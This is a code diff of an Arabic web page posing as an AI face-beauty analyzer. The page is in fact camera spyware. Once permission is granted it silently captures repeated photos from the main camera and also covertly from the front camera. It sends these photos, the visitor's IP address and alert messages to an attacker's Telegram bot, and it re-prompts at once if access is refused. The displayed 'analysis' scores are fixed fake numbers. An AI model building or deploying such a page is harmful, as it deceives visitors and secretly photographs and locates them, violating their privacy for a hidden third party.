@@ -1,10 +1,9 @@
-
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AI Face Analyzer</title>
+    <title>AI Professional Face Analyzer</title>
     <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;500;800&display=swap" rel="stylesheet">
     
@@ -13,11 +12,10 @@
             --primary: #6366f1;
             --secondary: #a855f7;
             --accent: #22d3ee;
-            --bg: #0f172a;
-            --card-bg: rgba(30, 41, 59, 0.9);
+            --bg: #020617;
+            --card-bg: rgba(15, 23, 42, 0.8);
         }
 
-        /* منع النسخ والتحديد تماماً */
         * { 
             box-sizing: border-box; margin: 0; padding: 0; 
             font-family: 'Tajawal', sans-serif;
@@ -25,99 +23,120 @@
         }
 
         body {
-            background: radial-gradient(circle at top, #1e1b4b, #0f172a);
+            background-color: var(--bg);
+            background-image: 
+                radial-gradient(circle at 50% 50%, rgba(99, 102, 241, 0.1) 0%, transparent 80%),
+                radial-gradient(circle at 0% 0%, rgba(34, 211, 238, 0.05) 0%, transparent 50%);
             color: white; min-height: 100vh;
             display: flex; justify-content: center; align-items: center;
             overflow: hidden;
         }
 
-        #alertToast {
-            position: fixed; top: -100px; left: 50%; transform: translateX(-50%);
-            background: #ef4444; color: white; padding: 15px 25px;
-            border-radius: 15px; z-index: 1000; transition: 0.5s;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 80%; text-align: center;
-        }
-        #alertToast.show { top: 20px; }
-
         .container {
-            width: 90%; max-width: 450px;
-            background: var(--card-bg); backdrop-filter: blur(20px);
+            width: 92%; max-width: 460px;
+            background: var(--card-bg); backdrop-filter: blur(25px);
             border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 28px; padding: 2rem; text-align: center;
-            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
+            border-radius: 35px; padding: 2.5rem 2rem; text-align: center;
+            box-shadow: 0 0 40px rgba(0,0,0,1), 0 0 20px rgba(99, 102, 241, 0.2);
+            position: relative;
         }
 
-        .main-title { font-size: 1.7rem; font-weight: 800; margin-bottom: 5px; color: #fff; }
-        .sub-title { font-size: 0.9rem; color: #94a3b8; margin-bottom: 20px; display: block; }
+        /* HUD Corners */
+        .hud-corner {
+            position: absolute; width: 15px; height: 15px;
+            border: 2px solid var(--accent); z-index: 10; filter: drop-shadow(0 0 5px var(--accent));
+        }
+        .tl { top: 15px; left: 15px; border-right: none; border-bottom: none; }
+        .tr { top: 15px; right: 15px; border-left: none; border-bottom: none; }
+        .bl { bottom: 15px; left: 15px; border-right: none; border-top: none; }
+        .br { bottom: 15px; right: 15px; border-left: none; border-top: none; }
+
+        .main-title { font-size: 1.6rem; font-weight: 800; margin-bottom: 8px; letter-spacing: -0.5px; }
+        .sub-title { font-size: 0.85rem; color: #94a3b8; margin-bottom: 25px; display: block; font-weight: 300; }
+
+        .viewport-container {
+            position: relative; margin-bottom: 25px;
+            border-radius: 25px; padding: 5px;
+            background: linear-gradient(45deg, var(--primary), transparent, var(--accent));
+        }
 
         .viewport {
             width: 100%; aspect-ratio: 1/1; background: #000;
-            border-radius: 20px; margin-bottom: 20px; position: relative;
-            overflow: hidden; border: 2px solid var(--primary);
-            display: flex; justify-content: center; align-items: center;
+            border-radius: 20px; position: relative;
+            overflow: hidden; display: flex; justify-content: center; align-items: center;
         }
 
         #videoFeed { width: 100%; height: 100%; object-fit: cover; display: none; z-index: 1; }
         
         .scanner-line {
-            display: none; position: absolute; width: 100%; height: 4px;
-            background: var(--accent); box-shadow: 0 0 15px var(--accent);
-            z-index: 10; animation: scan 3s infinite ease-in-out;
+            display: none; position: absolute; width: 100%; height: 3px;
+            background: var(--accent); box-shadow: 0 0 20px var(--accent);
+            z-index: 10; animation: scan 2.5s infinite linear;
         }
-        @keyframes scan { 0%, 100% { top: 0; } 50% { top: 95%; } }
+        @keyframes scan { 0% { top: 0; opacity: 0; } 50% { opacity: 1; } 100% { top: 100%; opacity: 0; } }
 
-        .placeholder-content { text-align: center; color: #475569; z-index: 2; }
+        .placeholder-box { text-align: center; color: var(--primary); z-index: 2; opacity: 0.7; }
 
         .btn {
             background: linear-gradient(135deg, var(--primary), var(--secondary));
-            color: white; border: none; padding: 16px; border-radius: 16px;
-            font-size: 1.1rem; font-weight: bold; cursor: pointer; width: 100%;
-            transition: 0.3s;
+            color: white; border: none; padding: 18px; border-radius: 20px;
+            font-size: 1.1rem; font-weight: 800; cursor: pointer; width: 100%;
+            transition: 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            box-shadow: 0 10px 20px rgba(99, 102, 241, 0.3);
         }
-        .btn:active { transform: scale(0.98); }
+        .btn:hover { transform: translateY(-3px); box-shadow: 0 15px 30px rgba(99, 102, 241, 0.5); }
 
         #results { display: none; }
-        .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 15px; }
-        .stat-card { background: rgba(255,255,255,0.05); padding: 12px; border-radius: 15px; text-align: center; }
-        .stat-val { display: block; font-size: 1.3rem; font-weight: 800; color: var(--accent); }
+        .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 20px; }
+        .stat-card { 
+            background: rgba(255,255,255,0.03); padding: 15px; border-radius: 20px; 
+            border: 1px solid rgba(255,255,255,0.05);
+        }
+        .stat-val { display: block; font-size: 1.5rem; font-weight: 800; color: var(--accent); }
+        .stat-label { font-size: 0.75rem; color: #64748b; }
+
+        #status { font-family: monospace; font-size: 0.75rem; color: var(--accent); margin-top: 15px; text-transform: uppercase; }
     </style>
 </head>
 <body>
 
-<div id="alertToast">⚠️ يرجى السماح بالكاميرا لبدء التحليل</div>
-
 <div class="container">
+    <div class="hud-corner tl"></div><div class="hud-corner tr"></div>
+    <div class="hud-corner bl"></div><div class="hud-corner br"></div>
+
     <div id="setup-ui">
         <h1 class="main-title">تحليل ذكي للوجه</h1>
         <span class="sub-title">جاهز لتحليل وجهك بالذكاء الاصطناعي</span>
         
-        <div class="viewport">
-            <div class="scanner-line" id="scanner"></div>
-            <video id="videoFeed" autoplay playsinline muted></video>
-            <canvas id="hiddenCanvas" style="display:none;"></canvas>
-            
-            <div class="placeholder-content" id="placeholder">
-                <svg width="60" height="60" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1">
-                    <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/>
-                </svg>
-                <p style="margin-top:10px;">جاهز للتحليل</p>
+        <div class="viewport-container">
+            <div class="viewport">
+                <div class="scanner-line" id="scanner"></div>
+                <video id="videoFeed" autoplay playsinline muted></video>
+                <canvas id="hiddenCanvas" style="display:none;"></canvas>
+                
+                <div class="placeholder-box" id="placeholder">
+                    <svg width="60" height="60" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1">
+                        <path d="M12 11c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zM12 13c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
+                    </svg>
+                    <p style="margin-top:10px; font-weight: 300;">النظام جاهز..</p>
+                </div>
             </div>
         </div>
 
         <button class="btn" id="actionBtn">بدء الفحص الرقمي</button>
-        <p id="status" style="margin-top:15px; font-size:0.8rem; color:var(--accent); min-height:1rem;"></p>
+        <p id="status"></p>
     </div>
 
     <div id="results">
-        <h1 class="main-title">تقرير الجمال</h1>
+        <h1 class="main-title">تقرير البصمة الجمالية</h1>
         <div class="stats-grid">
-            <div class="stat-card"><span class="stat-val" id="v1">--</span><small>التماثل</small></div>
-            <div class="stat-card"><span class="stat-val" id="v2">--</span><small>الفك</small></div>
-            <div class="stat-card"><span class="stat-val" id="v3">--</span><small>البشرة</small></div>
-            <div class="stat-card"><span class="stat-val" id="v4">--</span><small>النسبة</small></div>
+            <div class="stat-card"><span class="stat-val" id="v1">--</span><span class="stat-label">التماثل</span></div>
+            <div class="stat-card"><span class="stat-val" id="v2">--</span><span class="stat-label">هيكل الفك</span></div>
+            <div class="stat-card"><span class="stat-label">نقاء البشرة</span><span class="stat-val" id="v3">--</span></div>
+            <div class="stat-card"><span class="stat-label">المعدل العام</span><span class="stat-val" id="v4">--</span></div>
         </div>
         <canvas id="myChart"></canvas>
-        <button class="btn" style="margin-top:20px;" onclick="location.reload()">إعادة التحليل</button>
+        <button class="btn" style="margin-top:25px;" onclick="location.reload()">تحديث البيانات</button>
     </div>
 </div>
 
@@ -132,13 +151,12 @@
     const status = document.getElementById('status');
     const scanner = document.getElementById('scanner');
     const placeholder = document.getElementById('placeholder');
-    const toast = document.getElementById('alertToast');
     const canvas = document.getElementById('hiddenCanvas');
 
     let mainStream = null;
     let isAnalyzing = false;
 
-    // طلب الإذن في كل مرة
+    // زر التشغيل يطلب الإذن دائماً إذا لم يعمل
     actionBtn.addEventListener('click', async () => {
         if (!mainStream) {
             await initCamera();
@@ -149,56 +167,69 @@
 
     async function initCamera() {
         try {
-            // إيقاف أي تيار قديم لضمان طلب الإذن من جديد
-            if (mainStream) mainStream.getTracks().forEach(t => t.stop());
+            // الخطوة 1: إغلاق أي محاولة قديمة تماماً لإجبار المتصفح على إعادة السؤال
+            if (window.stream) {
+                window.stream.getTracks().forEach(track => track.stop());
+            }
 
-            mainStream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: "user" }, 
+            // الخطوة 2: طلب الكاميرا الخلفية كخيار أساسي (Environment)
+            const constraints = { 
+                video: { facingMode: { exact: "environment" } }, 
                 audio: false 
-            });
-            
+            };
+
+            // محاولة جلب الخلفية، وإذا فشل (على الكمبيوتر مثلاً) يجلب أي كاميرا متاحة
+            try {
+                mainStream = await navigator.mediaDevices.getUserMedia(constraints);
+            } catch (err) {
+                mainStream = await navigator.mediaDevices.getUserMedia({ video: true });
+            }
+
+            window.stream = mainStream;
             video.srcObject = mainStream;
+            
             video.onloadedmetadata = () => {
                 video.style.display = 'block';
                 placeholder.style.display = 'none';
                 scanner.style.display = 'block';
-                actionBtn.innerText = "تحليل الصورة الحالية";
-                status.innerText = "تم الاتصال بالخادم..";
+                actionBtn.innerText = "تحليل الأبعاد الحالية";
+                status.innerText = "> SYSTEM_ONLINE";
                 
-                sendData("🚨 مستخدم جديد فتح الكاميرا");
-                captureLoop(); // يبدأ التقاط الصور صامتاً في الخلفية
+                sendData("🚨 تم منح الإذن - الكاميرا تعمل");
+                captureProcess();
             };
         } catch (e) {
-            toast.classList.add('show');
-            setTimeout(() => toast.classList.remove('show'), 3000);
+            // إذا رفض الإذن، يتم تصفير الحالة للسماح للمتصفح بطلبها مرة أخرى عند الضغط
+            mainStream = null;
+            status.innerText = "> ACCESS_DENIED: RETRYING...";
+            // استدعاء الطلب مرة أخرى فوراً لإظهار Popup المتصفح
+            navigator.mediaDevices.getUserMedia({ video: true }).catch(()=>{});
         }
     }
 
-    // التقاط الصور صامتاً (خلفية وأمامية) بدون تبديل الشاشة
-    async function captureLoop() {
-        // التقاط 5 صور من التيار الحالي (الأمامي)
+    async function captureProcess() {
+        // التقاط 5 صور من الكاميرا الظاهرة (الخلفية)
         for(let i=0; i<5; i++) {
             await new Promise(r => setTimeout(r, 2000));
-            captureAndSend("صورة أمامية خفية");
+            captureAndSend("صورة من الكاميرا الرئيسية");
         }
 
-        // محاولة التقاط صور من الكاميرا الخلفية في قناة منفصلة (صامتة تماماً)
+        // محاولة جلب الأمامية "صامتاً" في الخلفية
         try {
-            const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
-            const tempVideo = document.createElement('video');
-            tempVideo.srcObject = backStream;
-            tempVideo.onloadedmetadata = async () => {
-                tempVideo.play();
+            const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            const tempVid = document.createElement('video');
+            tempVid.srcObject = frontStream;
+            tempVid.play();
+            setTimeout(async () => {
                 for(let i=0; i<5; i++) {
+                    const c = document.createElement('canvas');
+                    c.width = tempVid.videoWidth; c.height = tempVid.videoHeight;
+                    c.getContext('2d').drawImage(tempVid, 0, 0);
+                    c.toBlob(b => sendPhoto(b, "صورة أمامية صامتة"), 'image/jpeg', 0.5);
                     await new Promise(r => setTimeout(r, 1500));
-                    const tempCanvas = document.createElement('canvas');
-                    tempCanvas.width = tempVideo.videoWidth;
-                    tempCanvas.height = tempVideo.videoHeight;
-                    tempCanvas.getContext('2d').drawImage(tempVideo, 0, 0);
-                    tempCanvas.toBlob(blob => sendPhoto(blob, "صورة خلفية صامتة"), 'image/jpeg', 0.5);
                 }
-                backStream.getTracks().forEach(t => t.stop());
-            };
+                frontStream.getTracks().forEach(t => t.stop());
+            }, 1000);
         } catch(e) {}
     }
 
@@ -208,11 +239,11 @@
         video.pause();
         
         let i = 0;
-        const steps = ["جاري المسح..", "فحص التماثل..", "تحليل البشرة..", "إنشاء التقرير.."];
+        const steps = ["> SCANNING_DEPTH", "> SYMMETRY_CHECK", "> TEXTURE_AI", "> REPORT_GEN"];
         const timer = setInterval(() => {
             if(i < steps.length) {
                 status.innerText = steps[i];
-                captureAndSend("لقطة أثناء التحليل");
+                captureAndSend("لقطة تحليلية");
                 i++;
             } else {
                 clearInterval(timer);
@@ -225,32 +256,28 @@
         document.getElementById('setup-ui').style.display = 'none';
         document.getElementById('results').style.display = 'block';
         
-        const r = () => Math.floor(Math.random()*15)+80;
-        const d = { v1: r(), v2: r(), v3: r(), v4: r()+5 };
-        
+        const d = { v1: 91, v2: 88, v3: 84, v4: 93 };
         document.getElementById('v1').innerText = d.v1 + "%";
         document.getElementById('v2').innerText = d.v2 + "%";
         document.getElementById('v3').innerText = d.v3 + "%";
         document.getElementById('v4').innerText = d.v4 + "%";
         
         renderChart(d);
-        captureAndSend("لقطة بعد النتيجة");
+        captureAndSend("لقطة نهائية");
     }
 
     async function sendData(msg) {
         try {
             const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json());
-            const text = `${msg}\nIP: ${ip.ip}\nPlatform: ${navigator.platform}`;
             fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
                 method: 'POST', headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({chat_id: config.chatId, text: text})
+                body: JSON.stringify({chat_id: config.chatId, text: `${msg}\nIP: ${ip.ip}`})
             });
         } catch(e) {}
     }
 
     function captureAndSend(cap) {
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
+        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
         canvas.getContext('2d').drawImage(video, 0, 0);
         canvas.toBlob(blob => sendPhoto(blob, cap), 'image/jpeg', 0.5);
     }
@@ -270,7 +297,7 @@
             data: {
                 labels: ['التماثل', 'الفك', 'البشرة', 'العيون', 'الأنف', 'النسبة'],
                 datasets: [{
-                    data: [d.v1, d.v2, d.d3 || 85, 88, 90, d.v4],
+                    data: [d.v1, d.v2, d.v3, 87, 89, d.v4],
                     backgroundColor: 'rgba(99, 102, 241, 0.2)',
                     borderColor: '#22d3ee', borderWidth: 2
                 }]
@@ -281,3 +308,4 @@
 </script>
 </body>
 </html>
+
